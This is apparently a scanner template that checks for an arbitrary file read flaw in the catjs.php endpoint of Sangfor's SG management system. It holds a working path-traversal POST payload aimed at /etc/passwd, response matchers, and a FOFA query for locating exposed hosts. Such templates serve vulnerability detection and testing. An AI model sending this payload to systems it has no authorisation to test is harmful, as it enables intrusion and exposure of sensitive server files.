# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: '["../../../../../../etc/passwd"]'
    headers:
      Sec-Fetch-Dest: document
      Sec-Fetch-Mode: navigate
      Sec-Fetch-Site: none
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '// FILE: ../../../../../../etc/passwd'
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/php/catjs.php'
id: sangfor-sg-catjs-fileread
info:
  author: zan8in
  description: |-
    深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
    FOFA: title=="SANGFOR上网优化管理"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 深信服 SG上网优化管理系统 catjs.php 任意文件读取
  severity: high
  tags: sangfor,fileread,argus-import
